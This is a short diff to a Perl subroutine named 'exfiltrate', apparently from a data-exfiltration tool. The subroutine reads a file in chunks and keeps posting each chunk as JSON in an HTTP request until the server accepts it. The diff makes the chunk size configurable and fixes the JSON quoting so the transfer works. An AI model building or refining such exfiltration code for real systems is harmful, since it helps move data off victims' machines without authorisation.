@@ -35,10 +35,10 @@ sub exfiltrate {
 
     setHeader($request);
 
-    while (($n = read $self->file, $data, 4) != 0) {
+    while (($n = read $self->file, $data, $self->size) != 0) {
         $res = 0;
 
-        $request->content('{ "data": ' . $data . ' }');
+        $request->content('{ "data": "' . $data . '" }');
 
         while (!$res || $res->code != 200) {
             $res = $userAgent->request($request);
